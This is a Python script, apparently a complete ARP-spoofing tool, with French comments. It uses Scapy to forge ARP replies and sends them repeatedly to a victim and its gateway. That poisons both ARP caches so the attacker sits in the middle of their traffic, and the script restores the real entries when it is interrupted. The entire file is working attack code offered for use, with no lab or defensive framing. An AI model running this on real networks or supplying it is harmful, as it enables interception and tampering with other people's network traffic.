# arp_spoofer.py

from scapy.all import ARP, Ether, sendp
import time

def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):
    """
    Construit un paquet ARP pour usurper une IP.
    src_ip: IP à usurper
    src_mac: MAC de l'attaquant
    dst_ip: cible du spoofing
    dst_mac: MAC de la cible
    """
    ether = Ether(dst=dst_mac, src=src_mac)
    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac, hwdst=dst_mac)
    return ether / arp

def start_arp_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval=2):
    """
    Démarre l’attaque ARP entre la victime et la passerelle.
    """
    print("[*] Starting ARP spoofing...")
    try:
        while True:
            # Empoisonner la victime : on se fait passer pour la passerelle
            pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)
            # Empoisonner la passerelle : on se fait passer pour la victime
            pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)

            sendp(pkt_to_victim, iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)

            print(f"[+] Sent ARP spoof packets to {victim_ip} and {gateway_ip}")
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[!] Spoofing interrupted by user.")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        print("[+] ARP tables restored.")

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):
    """
    Restaure les tables ARP des machines après l’attaque.
    """
    print("[*] Restoring ARP tables...")

    # On renvoie les vraies associations
    pkt1 = build_arp_packet(gateway_ip, gateway_mac, victim_ip, victim_mac)
    pkt2 = build_arp_packet(victim_ip, victim_mac, gateway_ip, gateway_mac)

    # On envoie plusieurs fois pour assurer la propagation
    for _ in range(5):
        sendp(pkt1, iface=iface, verbose=False)
        sendp(pkt2, iface=iface, verbose=False)
        time.sleep(1)

    print("[+] ARP tables restored successfully.")
